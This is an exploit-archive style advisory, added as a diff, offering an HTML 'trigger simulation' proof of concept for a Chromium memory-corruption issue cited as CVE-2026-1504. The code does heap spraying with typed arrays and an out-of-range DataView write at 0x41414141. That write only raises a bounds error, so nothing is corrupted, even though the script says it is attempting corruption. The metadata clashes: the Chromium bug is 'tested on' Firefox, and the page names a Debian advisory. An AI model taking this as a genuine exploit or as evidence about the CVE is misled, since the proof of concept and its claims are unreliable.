@@ -1,0 +1,63 @@
+=============================================================================================================================================
+| # Title     : Chromium – Memory Corruption Trigger Simulation                                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.chromium.org/chromium-projects/                                                                                 |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214652/ & 	CVE-2026-1504
+
+[+] Summary    : a theoretical trigger simulation for a Chromium-class vulnerability associated with memory corruption scenarios commonly affecting the V8 JavaScript engine or the Blink rendering engine.
+                 The code intentionally performs heap allocation patterns and unsafe memory access attempts in order to observe browser stability, crash behavior, or exception handling, as typically analyzed during vulnerability research.
+				 No real exploit logic, sandbox escape, or code execution is implemented.
+                 This PoC does not claim the existence of a working vulnerability, nor does it exploit any confirmed flaw in Chromium. 
+				 It is provided strictly for educational, testing, and defensive research purposes, illustrating how memory corruption conditions are conceptually triggered during browser security analysis.
+
+
+
+[+] POC :  poc.html
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2026-1504 PoC Trigger</title>
+</head>
+<body>
+    <script>
+    
+        function trigger() {
+
+            let heap_filler = [];
+            for (let i = 0; i < 1000; i++) {
+                heap_filler[i] = new Uint32Array(1024);
+            }
+
+            try {
+
+                let buffer = new ArrayBuffer(0x1000000); 
+                let view = new DataView(buffer);
+              
+                let corrupted_ptr = 0x41414141; 
+                
+                console.log("[*] Attempting to trigger memory corruption...");
+                
+      
+                view.setUint32(corrupted_ptr, 0xdeadbeef); 
+
+            } catch (e) {
+                console.error("[-] Error during execution: " + e.message);
+            }
+        }
+
+        window.onload = function() {
+            setTimeout(trigger, 500);
+        };
+    </script>
+    <h2>Chromium Security Advisory DSA-6116-1 Testing</h2>
+    <p>Check the console (F12) to see execution status.</p>
+</body>
+</html>
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
